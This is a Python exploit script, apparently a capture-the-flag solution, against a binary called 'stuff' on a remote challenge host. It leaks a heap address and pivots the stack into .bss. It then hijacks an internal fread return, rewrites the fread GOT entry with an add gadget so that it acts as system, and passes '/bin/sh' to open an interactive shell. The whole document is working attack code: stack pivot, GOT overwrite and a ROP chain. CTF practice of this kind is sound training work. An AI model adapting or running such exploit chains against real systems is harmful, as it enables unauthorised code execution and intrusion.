#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from rootkit.exploit import *
from time import sleep

exe = context.binary = ELF("stuff")
host = args.HOST or "lac.tf"
port = int(args.PORT or 31182)

gdbscript = """
tbreak main
b *0x00000000401234
continue
""".format(
    **locals()
)


def choice(option):
    sla(b"2. do stuff\n", str(option).encode())


libc = SetupLibcELF()
io = start()

choice(1)

heap_base = GetInt(rl())[0] - 0x12EC0
bss = 0x404075
call_read = 0x000000000040120F

hb()

choice(2)

sl(
    b"a" * 15 + p(0x404075 + 0x100 + 0x88) + p(call_read) + b"\xff"
)  # call fread while u have pivoted to bss
sl(
    b"a" * 6 + p(0xDEADBEEF) + p(0x404075 + 0x100 + 0x88 - 25) + p(call_read)
)  # overwrite the return address of internal fread function
sl(
    p(0xFFFFFFFFFFFD5470)
    + p(heap_base + 0x11EC8 - 8)  # ptr to binsh
    + b"/bin/sh\x00"
    + pop("rbp", exe.got.fread + 0x3D)
    + p(0x0000000040115C)  # add    dword ptr [rbp - 0x3d], ebx
    + pop("rbp", heap_base + 0x11EC0 + 0x10)  # set rbp -> binsh pointer
    + gadget("ret")
    + p(call_read)  # fread is not system and rdi is a pointer to binsh. shell!!!
)

io.interactive()
